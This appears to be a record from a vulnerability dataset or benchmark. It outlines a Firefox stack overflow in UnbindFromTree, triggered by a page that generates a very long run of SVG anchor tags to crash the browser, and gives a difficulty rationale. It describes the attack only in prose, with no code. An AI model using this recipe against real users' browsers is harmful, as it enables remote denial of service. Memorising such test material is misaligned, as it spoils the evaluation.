title: Stack overflow in UnbindFromTree (browser can be crashed remotely)
steps: Create an HTML file with a script that generates a very long string of SVG anchor tags (<a>)
Load this HTML file in a vulnerable version of Firefox to trigger a stack overflow in the UnbindFromTree function
vuln_description: The vulnerability is a stack overflow in Firefox's UnbindFromTree function, which can be triggered remotely by loading a specially crafted SVG image containing an extremely long string of anchor tags. This causes the browser to crash.
reason: The vulnerability requires understanding how to craft a malicious SVG image and how to trigger the stack overflow, but the components are straightforward and the interaction is not particularly subtle.
